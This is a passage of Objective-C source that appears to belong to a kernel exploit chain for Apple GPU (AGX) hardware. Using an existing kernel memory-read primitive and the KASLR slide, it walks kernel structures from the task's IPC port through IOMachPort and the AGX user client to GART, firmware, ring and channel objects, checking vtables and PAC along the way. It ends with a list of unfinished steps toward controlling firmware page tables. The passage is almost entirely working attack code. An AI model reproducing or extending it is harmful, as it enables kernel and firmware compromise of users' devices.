        const uint8_t *refBytes = (const uint8_t *)deviceRef;
        io_service_t refService = IO_OBJECT_NULL;
        memcpy(&refService, refBytes + 0x10, sizeof(refService));
        memcpy(&connection, refBytes + 0x14, sizeof(connection));
        deviceShape = deviceShape && refService == service;
    }
    mach_port_type_t connectionType = 0;
    kern_return_t connectionTypeKR = MACH_PORT_VALID(connection)
        ? mach_port_type(mach_task_self(), connection, &connectionType)
        : KERN_INVALID_NAME;
    deviceShape = deviceShape && MACH_PORT_VALID(connection) &&
        connectionTypeKR == KERN_SUCCESS &&
        (connectionType & MACH_PORT_TYPE_SEND) != 0;
    report[@"metalDeviceConnection"] = @{
        @"deviceClass": NSStringFromClass(concreteClass) ?: @"",
        @"requiredBaseClass": @"IOGPUMetalDevice",
        @"deviceRefOffset": deviceRefOffset >= 0
            ? [NSString stringWithFormat:@"0x%tx", deviceRefOffset]
            : @"unavailable",
        @"acceleratorPortOffset": acceleratorPortOffset >= 0
            ? [NSString stringWithFormat:@"0x%tx", acceleratorPortOffset]
            : @"unavailable",
        @"deviceRef": CNDAGXHex((uintptr_t)deviceRef),
        @"deviceRefStable": @(deviceRefSecond == deviceRef),
        @"deviceRefAligned": @(
            ((uintptr_t)deviceRef & (sizeof(void *) - 1)) == 0),
        @"service": CNDAGXHex((uint32_t)service),
        @"connection": CNDAGXHex((uint32_t)connection),
        @"connectionSendRight": @(
            (connectionType & MACH_PORT_TYPE_SEND) != 0),
        @"passed": @(deviceShape),
    };
    CNDAGXPersist(report);
    if (!deviceShape) {
        CNDAGXFinish(report, @"preflight-stopped-metal-connection-bridge",
                     generationStart, completion);
        return;
    }

    uint64_t selfTask = api.taskSelf();
    uint64_t canonicalSelfTask = CNDAGXCanonical(&api, selfTask);
    bool selfTaskPassed = selfTask != 0 && canonicalSelfTask == selfTask &&
        (selfTask & 0x7) == 0;
    report[@"selfTaskPredicate"] = @{
        @"raw": CNDAGXHex(selfTask),
        @"canonical": CNDAGXHex(canonicalSelfTask),
        @"aligned8": @((selfTask & 0x7) == 0),
        @"passed": @(selfTaskPassed),
    };
    CNDAGXPersist(report);
    if (!selfTaskPassed) {
        CNDAGXFinish(report, @"preflight-stopped-self-task-identity",
                     generationStart, completion);
        return;
    }
    uint64_t portObjectBefore = api.portObject(selfTask, connection);
    uint64_t canonicalPortObject = CNDAGXCanonical(&api, portObjectBefore);
    bool portObjectPassed = portObjectBefore != 0 &&
        canonicalPortObject == portObjectBefore &&
        (portObjectBefore & 0x7) == 0;
    report[@"connectionPortObjectPredicate"] = @{
        @"raw": CNDAGXHex(portObjectBefore),
        @"canonical": CNDAGXHex(canonicalPortObject),
        @"aligned8": @((portObjectBefore & 0x7) == 0),
        @"passed": @(portObjectPassed),
    };
    CNDAGXPersist(report);
    if (!portObjectPassed) {
        CNDAGXFinish(report, @"preflight-stopped-port-object-identity",
                     generationStart, completion);
        return;
    }
    uint64_t ipKobjectAddress = portObjectBefore + CNDAGXIPKObjectOffset;
    uint64_t wrapperRawBefore = 0;
    io_service_t authenticatedService = IO_OBJECT_NULL;
    kern_return_t authKR = CNDAGXRead64(
        &api, ipKobjectAddress, &wrapperRawBefore)
        ? IOConnectGetService(connection, &authenticatedService)
        : KERN_FAILURE;
    bool authPassed = (authKR == CNDAGXExpectedNoService &&
                       authenticatedService == IO_OBJECT_NULL) ||
        (authKR == KERN_SUCCESS && authenticatedService != IO_OBJECT_NULL);
    if (authenticatedService != IO_OBJECT_NULL) {
        IOObjectRelease(authenticatedService);
        authenticatedService = IO_OBJECT_NULL;
    }
    uint64_t portObjectAfter = api.portObject(selfTask, connection);
    uint64_t wrapperRawAfter = 0;
    bool stableWrapper = authPassed && portObjectBefore != 0 &&
        portObjectAfter == portObjectBefore &&
        CNDAGXRead64(&api, ipKobjectAddress, &wrapperRawAfter) &&
        wrapperRawAfter == wrapperRawBefore;
    uint64_t wrapper = stableWrapper
        ? CNDAGXCanonical(&api, wrapperRawAfter) : 0;
    if (wrapper == 0 || !CNDAGXValidateVptr(
            report, &api, @"metalIOMachPortPredicate", wrapper,
            CNDAGXIOMachPortVtable, slide, YES)) {
        CNDAGXFinish(report, @"preflight-stopped-iomachport-identity",
                     generationStart, completion);
        return;
    }
    uint64_t clientRaw = 0;
    if (!CNDAGXReadStable64(&api, wrapper + CNDAGXIOMachPortObject,
                            &clientRaw)) {
        CNDAGXFinish(report, @"preflight-stopped-client-read",
                     generationStart, completion);
        return;
    }
    uint64_t client = CNDAGXCanonical(&api, clientRaw);
    if (client == 0 || !CNDAGXValidateVptr(
            report, &api, @"agxDeviceUserClientPredicate", client,
            CNDAGXDeviceUserClientVtable, slide, YES)) {
        CNDAGXFinish(report, @"preflight-stopped-agx-client-identity",
                     generationStart, completion);
        return;
    }
    uint64_t taskRaw = 0, gartRaw = 0, acceleratorRaw = 0;
    if (!CNDAGXReadStable64(&api, client + CNDAGXClientTask, &taskRaw) ||
        !CNDAGXReadStable64(&api, client + CNDAGXClientProvider,
                            &acceleratorRaw)) {
        CNDAGXFinish(report, @"preflight-stopped-client-fields",
                     generationStart, completion);
        return;
    }
    uint64_t task = CNDAGXCanonical(&api, taskRaw);
    uint64_t accelerator = CNDAGXCanonical(&api, acceleratorRaw);
    if (task == 0 || accelerator == 0 ||
        !CNDAGXValidateVptr(report, &api, @"agxSharedTaskPredicate", task,
                            CNDAGXSharedVtable, slide, NO) ||
        !CNDAGXValidateVptr(report, &api, @"agxAcceleratorPredicate",
                            accelerator, CNDAGXAcceleratorVtable,
                            slide, NO) ||
        !CNDAGXReadStable64(&api, task + CNDAGXTaskGart, &gartRaw)) {
        CNDAGXFinish(report, @"preflight-stopped-task-or-accelerator",
                     generationStart, completion);
        return;
    }
    uint64_t gart = CNDAGXCanonical(&api, gartRaw);
    if (gart == 0 || !CNDAGXValidateVptr(
            report, &api, @"agxTaskGartPredicate", gart,
            CNDAGXGartVtable, slide, NO)) {
        CNDAGXFinish(report, @"preflight-stopped-task-gart",
                     generationStart, completion);
        return;
    }
    report[@"metalTaskBridge"] = @{
        @"selfTask": CNDAGXHex(selfTask),
        @"ipcPort": CNDAGXHex(portObjectBefore),
        @"authKR": CNDAGXHex((uint32_t)authKR),
        @"wrapperStableAcrossKernelAuth": @(stableWrapper),
        @"wrapper": CNDAGXHex(wrapper),
        @"agxDeviceUserClient": CNDAGXHex(client),
        @"agxSharedTask": CNDAGXHex(task),
        @"taskGart": CNDAGXHex(gart),
        @"accelerator": CNDAGXHex(accelerator),
        @"selector8ResourceClient": @"not-joined",
        @"passed": @YES,
    };
    CNDAGXPersist(report);

    if (!CNDAGXProgress(report, @"firmware-ring-channel-inventory")) {
        CNDAGXFinish(report, @"refused-report-persistence-failed",
                     generationStart, completion);
        return;
    }
    uint64_t firmwareRaw = 0;
    if (!CNDAGXReadStable64(&api,
                            accelerator + CNDAGXAcceleratorFirmwareASC,
                            &firmwareRaw)) {
        CNDAGXFinish(report, @"preflight-stopped-firmware-read",
                     generationStart, completion);
        return;
    }
    uint64_t firmware = CNDAGXCanonical(&api, firmwareRaw);
    if (firmware == 0 || !CNDAGXValidateVptr(
            report, &api, @"agxFirmwarePredicate", firmware,
            CNDAGXArmFirmwareASCVtable, slide, NO)) {
        CNDAGXFinish(report, @"preflight-stopped-firmware-identity",
                     generationStart, completion);
        return;
    }
    uint64_t ring = firmware + CNDAGXFirmwareHostRing;
    bool ringStripMatch = CNDAGXValidateVptr(
        report, &api, @"agxHostRingPredicate", ring,
        CNDAGXHostRingVtable, slide, NO);
    report[@"agxHostRingInventory"] = @{
        @"ring": CNDAGXHex(ring),
        @"vptrStripMatched": @(ringStripMatch),
        @"requiredFieldPACDiscriminator": @"0x2fef",
        @"fieldPACRederived": @NO,
        @"indexBlockFieldRead": @NO,
        @"recordBufferFieldRead": @NO,
        @"hostFirmwareBackingJoin": @"unproved",
    };
    CNDAGXPersist(report);
    if (!ringStripMatch) {
        CNDAGXFinish(report, @"preflight-stopped-ring-identity",
                     generationStart, completion);
        return;
    }

    uint64_t channelRaw = 0;
    if (!CNDAGXReadStable64(&api, firmware + CNDAGXFirmwareChannel0,
                            &channelRaw)) {
        CNDAGXFinish(report, @"preflight-stopped-channel-read",
                     generationStart, completion);
        return;
    }
    uint64_t channel = CNDAGXCanonical(&api, channelRaw);
    if (channel == 0 || !CNDAGXValidateEitherVptr(
            report, &api, @"agxChannelPredicate", channel,
            CNDAGXChannelVtable0, CNDAGXChannelVtable1, slide)) {
        CNDAGXFinish(report, @"preflight-stopped-channel-identity",
                     generationStart, completion);
        return;
    }
    uint64_t gateRaw = 0, endpointRaw = 0, ownerRaw = 0;
    uint8_t dispatchFlag = 0;
    if (!CNDAGXReadStable64(&api, channel + CNDAGXChannelCommandGate,
                            &gateRaw) ||
        !CNDAGXReadStable64(&api, channel + CNDAGXChannelEndpoint,
                            &endpointRaw) ||
        !CNDAGXReadStable64(&api, channel + CNDAGXChannelOwner,
                            &ownerRaw) ||
        !CNDAGXRead8(&api, channel + CNDAGXChannelDispatchFlag,
                      &dispatchFlag)) {
        CNDAGXFinish(report, @"preflight-stopped-channel-fields",
                     generationStart, completion);
        return;
    }
    uint64_t gate = CNDAGXCanonical(&api, gateRaw);
    if (gate == 0 || !CNDAGXValidateVptr(
            report, &api, @"ioCommandGatePredicate", gate,
            CNDAGXIOCommandGateVtable, slide, NO)) {
        CNDAGXFinish(report, @"preflight-stopped-command-gate",
                     generationStart, completion);
        return;
    }
    report[@"agxChannelInventory"] = @{
        @"channel": CNDAGXHex(channel),
        @"commandGate": CNDAGXHex(gate),
        @"rawDynamicEndpoint": CNDAGXHex(endpointRaw),
        @"rawOwnerFallback": CNDAGXHex(ownerRaw),
        @"dispatchFlag": @(dispatchFlag),
        @"candidateBranch": endpointRaw != 0
            ? @"dynamic-endpoint-candidate" : @"owner-fallback-candidate",
        @"endpointVptrPinned": @NO,
        @"completionClaimed": @NO,
    };
    CNDAGXPersist(report);

    if (!CNDAGXProgress(report, @"output-metadata-inventory")) {
        CNDAGXFinish(report, @"refused-report-persistence-failed",
                     generationStart, completion);
        return;
    }
    uint64_t rtBuddyRaw = 0, rtFirmwareRaw = 0, coredumpRaw = 0;
    uint64_t segmentArrayRaw = 0, cpuMapArrayRaw = 0;
    if (!CNDAGXReadStable64(&api, channel + CNDAGXChannelRTBuddy,
                            &rtBuddyRaw)) {
        CNDAGXFinish(report, @"preflight-stopped-rtbuddy-read",
                     generationStart, completion);
        return;
    }
    uint64_t rtBuddy = CNDAGXCanonical(&api, rtBuddyRaw);
    if (rtBuddy == 0 || !CNDAGXValidateVptr(
            report, &api, @"rtBuddyPredicate", rtBuddy,
            CNDAGXRTBuddyVtable, slide, NO) ||
        !CNDAGXReadStable64(&api, rtBuddy + CNDAGXRTBuddyFirmware,
                            &rtFirmwareRaw)) {
        CNDAGXFinish(report, @"preflight-stopped-rtbuddy-identity",
                     generationStart, completion);
        return;
    }
    uint64_t rtFirmware = CNDAGXCanonical(&api, rtFirmwareRaw);
    if (rtFirmware == 0 || !CNDAGXValidateVptr(
            report, &api, @"rtBuddyFirmwarePredicate", rtFirmware,
            CNDAGXRTBuddyFirmwareVtable, slide, NO) ||
        !CNDAGXReadStable64(&api,
            rtFirmware + CNDAGXRTBuddyCoredumpMap, &coredumpRaw)) {
        CNDAGXFinish(report, @"preflight-stopped-rtbuddy-firmware",
                     generationStart, completion);
        return;
    }
    uint64_t coredump = CNDAGXCanonical(&api, coredumpRaw);
    if (coredump == 0 || !CNDAGXValidateVptr(
            report, &api, @"rtBuddyCoredumpMapPredicate", coredump,
            CNDAGXRTBuddyCoredumpMapVtable, slide, NO) ||
        !CNDAGXReadStable64(&api, coredump + CNDAGXCoredumpSegments,
                            &segmentArrayRaw) ||
        !CNDAGXReadStable64(&api, coredump + CNDAGXCoredumpCPUMaps,
                            &cpuMapArrayRaw)) {
        CNDAGXFinish(report, @"preflight-stopped-coredump-map",
                     generationStart, completion);
        return;
    }
    uint64_t segmentArray = CNDAGXCanonical(&api, segmentArrayRaw);
    uint64_t cpuMapArray = CNDAGXCanonical(&api, cpuMapArrayRaw);
    if (segmentArray == 0 || cpuMapArray == 0 ||
        !CNDAGXValidateVptr(report, &api, @"segmentOSArrayPredicate",
                            segmentArray, CNDAGXOSArrayVtable, slide, NO) ||
        !CNDAGXValidateVptr(report, &api, @"cpuMapOSArrayPredicate",
                            cpuMapArray, CNDAGXOSArrayVtable, slide, NO)) {
        CNDAGXFinish(report, @"preflight-stopped-output-arrays",
                     generationStart, completion);
        return;
    }
    uint32_t segmentCount = 0, cpuMapCount = 0;
    bool metadataPassed = CNDAGXReadOSArrayMetadata(
            report, &api, @"segmentOSArrayMetadata", segmentArray,
            &segmentCount) &&
        CNDAGXReadOSArrayMetadata(
            report, &api, @"cpuMapOSArrayMetadata", cpuMapArray,
            &cpuMapCount) && segmentCount == cpuMapCount;
    report[@"outputMetadataInventory"] = @{
        @"fixedFirmwareOutputTableVA":
            CNDAGXHex(CNDAGXFirmwareOutputTableVA),
        @"segmentCount": @(segmentCount),
        @"cpuMapCount": @(cpuMapCount),
        @"pairedCountsMatch": @(segmentCount == cpuMapCount),
        @"arrayBackingPACValidated": @NO,
        @"arrayBackingDereferenceAttempted": @NO,
        @"outputAliasEstablished": @NO,
        @"passed": @(metadataPassed),
    };
    CNDAGXPersist(report);
    if (!metadataPassed) {
        CNDAGXFinish(report, @"preflight-stopped-output-metadata",
                     generationStart, completion);
        return;
    }

    report[@"evidenceLevel"] = @"physical-observed-preflight-only";
    report[@"openJoins"] = @[
        @"selector8-kernel-resource-handle-to-wrapper-resourceID",
        @"selector8-IOGPUDeviceUserClient-to-held-Metal-task-client",
        @"owned-resource-to-live-GART-leaf-and-backing-frame",
        @"command20-active-firmware-EL1-TTBR0-TTBR1-TCR",
        @"firmware-load-translation-to-owned-frame",
        @"host-ring-to-firmware-descriptor-backing",
        @"exclusive-producer-ownership",
        @"fixed-output-table-CPU-alias",
        @"firmware-completion-discriminator",
    ];
    CNDAGXFinish(report, @"read-only-preflight-observed",
                 generationStart, completion);
}
